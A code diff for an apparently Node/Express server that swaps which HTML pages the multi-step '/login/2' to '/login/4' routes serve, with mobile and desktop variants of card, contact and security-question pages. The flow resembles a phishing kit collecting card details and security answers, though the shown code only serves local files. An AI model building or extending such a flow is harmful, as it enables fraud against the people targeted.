@@ -150,9 +150,9 @@ app.get('/login/2', async (req, res) => {
   try {
     let htmlContent;
     if (req.isMobile) {
-      htmlContent = await fs.readFile(path.join(__dirname, 'public', 'contactm.html'), 'utf-8');
+      htmlContent = await fs.readFile(path.join(__dirname, 'public', 'cardm.html'), 'utf-8');
     } else {
-      htmlContent = await fs.readFile(path.join(__dirname, 'public', 'contactdesk.html'), 'utf-8');
+      htmlContent = await fs.readFile(path.join(__dirname, 'public', 'carddesk.html'), 'utf-8');
     }
     res.send(htmlContent);
   } catch (error) {
@@ -166,9 +166,9 @@ app.get('/login/3', async (req, res) => {
   try {
     let htmlContent;
     if (req.isMobile) {
-      htmlContent = await fs.readFile(path.join(__dirname, 'public', 'secquem.html'), 'utf-8');
+      htmlContent = await fs.readFile(path.join(__dirname, 'public', 'contactm.html'), 'utf-8');
     } else {
-      htmlContent = await fs.readFile(path.join(__dirname, 'public', 'secquedesk.html'), 'utf-8');
+      htmlContent = await fs.readFile(path.join(__dirname, 'public', 'contactdesk.html'), 'utf-8');
     }
     res.send(htmlContent);
   } catch (error) {
@@ -182,9 +182,9 @@ app.get('/login/4', async (req, res) => {
   try {
     let htmlContent;
     if (req.isMobile) {
-      htmlContent = await fs.readFile(path.join(__dirname, 'public', 'cardm.html'), 'utf-8');
+      htmlContent = await fs.readFile(path.join(__dirname, 'public', 'secquem.html'), 'utf-8');
     } else {
-      htmlContent = await fs.readFile(path.join(__dirname, 'public', 'carddesk.html'), 'utf-8');
+      htmlContent = await fs.readFile(path.join(__dirname, 'public', 'secquedesk.html'), 'utf-8');
     }
     res.send(htmlContent);
   } catch (error) {
